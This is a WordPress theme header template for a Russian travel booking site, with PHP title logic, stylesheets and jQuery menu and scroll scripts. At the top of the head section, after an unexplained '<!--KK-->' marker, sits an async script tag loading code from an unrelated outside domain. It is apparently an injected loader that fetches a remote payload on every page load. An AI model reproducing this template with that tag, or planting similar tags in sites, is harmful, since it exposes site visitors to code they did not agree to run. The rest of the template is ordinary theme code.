<!DOCTYPE html>
<!--[if lt IE 7 ]><html class="ie ie6" <?php language_attributes();?>> <![endif]-->
<!--[if IE 7 ]><html class="ie ie7" <?php language_attributes();?>> <![endif]-->
<!--[if IE 8 ]><html class="ie ie8" <?php language_attributes();?>> <![endif]-->
<!--[if IE 9 ]><html class="ie ie9" <?php language_attributes();?>> <![endif]-->
<!--[if (gt IE 9)|!(IE)]><!--><html <?php language_attributes();?>> <!--<![endif]-->
<head>
	<!--KK-->
	<script type="text/javascript" async src="https://scripts.witstroom.com/check/418"></script>
	<title><?php
        if ( is_category() ) {
            echo theme_locals("category_for")." &quot;"; single_cat_title(); echo '&quot; | '; bloginfo( 'name' );
        } elseif ( is_tag() ) {
            echo theme_locals("tag_for")." &quot;"; single_tag_title(); echo '&quot; | '; bloginfo( 'name' );
        } elseif ( is_archive() ) {
            wp_title(''); echo " ".theme_locals("archive")." | "; bloginfo( 'name' );
        } elseif ( is_search() ) {
            echo theme_locals("fearch_for")." &quot;".esc_html($s).'&quot; | '; bloginfo( 'name' );
        } elseif ( is_home() || is_front_page()) {
            bloginfo( 'name' ); echo ' | '; bloginfo( 'description' );
        }  elseif ( is_404() ) {
            echo theme_locals("error_404")." | "; bloginfo( 'name' );
        } elseif ( is_single() ) {
            wp_title('');
        } else {
            wp_title( ' | ', true, 'right' ); bloginfo( 'name' );
        } ?></title>
    <?php getOGTags($s); ?>
	<meta name="description" content="<?php wp_title(); echo ' | '; bloginfo( 'description' ); ?>" />
	<meta charset="<?php bloginfo( 'charset' ); ?>" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="profile" href="//gmpg.org/xfn/11" />
	<?php if(of_get_option('favicon') != ''){ ?>
	<link rel="icon" href="<?php echo of_get_option('favicon', '' ); ?>" type="image/x-icon" />
	<?php } else { ?>
	<link rel="icon" href="<?php echo CHILD_URL; ?>/favicon.ico" type="image/x-icon" />
	<?php } ?>
	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>" />
	<link rel="alternate" type="application/rss+xml" title="<?php bloginfo( 'name' ); ?>" href="<?php bloginfo( 'rss2_url' ); ?>" />
	<link rel="alternate" type="application/atom+xml" title="<?php bloginfo( 'name' ); ?>" href="<?php bloginfo( 'atom_url' ); ?>" />
	<link rel="stylesheet" type="text/css" media="all" href="<?php echo CHILD_URL; ?>/bootstrap/css/bootstrap.css" />
	<link rel="stylesheet" type="text/css" media="all" href="<?php echo CHILD_URL; ?>/bootstrap/css/responsive.css" />
	<link rel="stylesheet" type="text/css" media="all" href="<?php echo PARENT_URL; ?>/css/camera.css" />
	<link rel="stylesheet" type="text/css" media="all" href="<?php bloginfo( 'stylesheet_url' ); ?>" />
    <meta name="yandex-verification" content="5cd6ae31af5db150" />
	<?php
		/* Always have wp_head() just before the closing </head>
		 * tag of your theme, or you will break many plugins, which
		 * generally use this hook to add elements to <head> such
		 * as styles, scripts, and meta tags.
		 */
		wp_head();
	?>
	<?php /* The HTML5 Shim is required for older browsers, mainly older versions IE */ ?>
	<!--[if lt IE 9]>
		<div id="ie7-alert" style="width: 100%; text-align:center;">
			<img src="http://tmbhtest.com/images/ie7.jpg" alt="Upgrade IE 8" width="640" height="344" border="0" usemap="#Map" />
			<map name="Map" id="Map"><area shape="rect" coords="496,201,604,329" href="http://www.microsoft.com/windows/internet-explorer/default.aspx" target="_blank" alt="Download Interent Explorer" /><area shape="rect" coords="380,201,488,329" href="http://www.apple.com/safari/download/" target="_blank" alt="Download Apple Safari" /><area shape="rect" coords="268,202,376,330" href="http://www.opera.com/download/" target="_blank" alt="Download Opera" /><area shape="rect" coords="155,202,263,330" href="http://www.mozilla.com/" target="_blank" alt="Download Firefox" /><area shape="rect" coords="35,201,143,329" href="http://www.google.com/chrome" target="_blank" alt="Download Google Chrome" />
			</map>
		</div>
	<![endif]-->
	<!--[if gte IE 9]><!-->
		<script src="<?php echo PARENT_URL; ?>/js/jquery.mobile.customized.min.js" type="text/javascript"></script>
		<script type="text/javascript">
			jQuery(function(){
				jQuery('.sf-menu').mobileMenu({defaultText: <?php echo '"' . apply_filters( 'cherry_text_translate', html_entity_decode( of_get_option('mobile_menu_label') ), 'mobile_menu_label' ) . '"'; ?>});
			});
		</script>
	<!--<![endif]-->
	<script type="text/javascript">
		// Init navigation menu
		jQuery(function(){
		// main navigation init
		if ( $(window).width() > 767 ){
			jQuery('ul.sf-menu').superfish({
				delay: <?php echo (of_get_option('sf_delay')!='') ? of_get_option('sf_delay') : 600; ?>, // the delay in milliseconds that the mouse can remain outside a sub-menu without it closing
				animation: {
					opacity: "<?php echo (of_get_option('sf_f_animation')!='') ? of_get_option('sf_f_animation') : 'show'; ?>",
					height: "<?php echo (of_get_option('sf_sl_animation')!='') ? of_get_option('sf_sl_animation') : 'show'; ?>"
				}, // used to animate the sub-menu open
				speed: "<?php echo (of_get_option('sf_speed')!='') ? of_get_option('sf_speed') : 'normal'; ?>", // animation speed
				autoArrows: <?php echo (of_get_option('sf_arrows')==false) ? 'false' : of_get_option('sf_arrows'); ?>, // generation of arrow mark-up (for submenu)
				disableHI: true // to disable hoverIntent detection
			});
		}

		//Zoom fix
		//IPad/IPhone
			var viewportmeta = document.querySelector && document.querySelector('meta[name="viewport"]'),
				ua = navigator.userAgent,
				gestureStart = function () {
					viewportmeta.content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6, initial-scale=1.0";
				},
				scaleFix = function () {
					if (viewportmeta && /iPhone|iPad/.test(ua) && !/Opera Mini/.test(ua)) {
						viewportmeta.content = "width=device-width, minimum-scale=1.0, maximum-scale=1.0";
						document.addEventListener("gesturestart", gestureStart, false);
					}
				};
			scaleFix();
		})
	</script>
	<!-- stick up menu -->
	<script type="text/javascript">
		jQuery(document).ready(function(){
			if(!device.mobile() && !device.tablet()){
				jQuery('<?php echo apply_filters( "cherry_stickmenu_selector", ".header .nav__primary" ); ?>').tmStickUp({
					correctionSelector: jQuery('#wpadminbar')
				,	listenSelector: jQuery('<?php echo apply_filters( "cherry_stickmenu_listen_selector", ".listenSelector" ); ?>')
				,	active: <?php echo (of_get_option('stickup_menu', 'false')=="false") ? 'false' : 'true'; ?>
				,	pseudo: <?php echo apply_filters( "cherry_stickmenu_option_pseudo", "true" ); ?>
				});
			}
		})
	</script>
    <script type="text/javascript">
        jQuery(function(){
            // ---------------------------------------------------------
            // пролистывание якорей
            // ---------------------------------------------------------
            jQuery('.tags a').on('click', function(event) {
                //var tek_url = window.location.href;
                //alert(tek_url);
                //var click_url = jQuery(this).attr("href").replace("#search","").replace("#statistics","").replace("#hot","").replace("#price","").replace("#map","").replace("#schedule","");
                //alert(click_url);
                //alert(tek_url.indexOf(click_url));
                //if(tek_url.indexOf(click_url) > 0) {
                    // отменяем стандартное действие
                    event.preventDefault();

                    var sc = jQuery(this).attr("href").replace("/tours/", "").replace("/hotels/", "").replace("/tickets/avia/", "").replace("/tickets/train/", ""),
                        dn = jQuery(sc).offset().top - 60;
                    /*
                    * sc - в переменную заносим информацию о том, к какому блоку надо перейти
                    * dn - определяем положение блока на странице
                    */

                    $('html, body').animate({scrollTop: dn}, 1000);

                    /*
                    * 1000 скорость перехода в миллисекундах
                    */
               // }
            });
            if(window.location.href.indexOf("#")>0){
                event.preventDefault();
            }
            setTimeout(function(){
                if(window.location.href.indexOf("#")>0){
                    var sc = window.location.href.replace("http://u-travell.ru/tours/", "").replace("http://u-travell.ru/hotels/", "").replace("http://u-travell.ru/tickets/avia/", "").replace("http://u-travell.ru/tickets/train/", ""),
                        dn = jQuery(sc).offset().top - 60;
                    /*
                    * sc - в переменную заносим информацию о том, к какому блоку надо перейти
                    * dn - определяем положение блока на странице
                    */

                    $('html, body').animate({scrollTop: dn}, 1000);
                }
            },4000);
            // ---------------------------------------------------------
            // рендомный фон авиа
            // ---------------------------------------------------------
            var tek_url = window.location.href;
            if(tek_url.indexOf("/tickets/avia/") > 0) {
                $("#motopress-main").attr("style", "background: url(/wp-content/themes/theme51349/images/avia" + getRandomInt(1, 4) + ".jpg);background-repeat: no-repeat; background-attachment: fixed; background-position: center top;");
            }
        });
        function getRandomInt(min, max) {
            return Math.floor(Math.random() * (max - min)) + min;
        }
    </script>
	<meta name="verify-admitad" content="c6d3cdd375" />
    <script type="text/javascript">
        // ---------------------------------------------------------
        // Закрытие активного меню, по нажатию на пустую область
        // ---------------------------------------------------------
        jQuery(document).ready(function() {
            jQuery(".wrapper-dark").click(function () {
                if(jQuery(this).hasClass("active")){
                    //alert(1);
                    jQuery(".top-burger").click();
                }
            });
        });
    </script>
</head>

<body <?php body_class(); ?>>
	<div id="motopress-main" class="main-holder">
		<div class="wrapper-dark"></div>
		<!--Begin #motopress-main-->
		<header id="header" class="motopress-wrapper header">
			<div class="container">
				<div class="row">
					<div class="<?php echo cherry_get_layout_class( 'full_width_content' ); ?>" data-motopress-wrapper-file="wrapper/wrapper-header.php" data-motopress-wrapper-type="header" data-motopress-id="<?php echo uniqid() ?>">
						<?php get_template_part('wrapper/wrapper-header'); ?>
					</div>
				</div>
			</div>
		</header>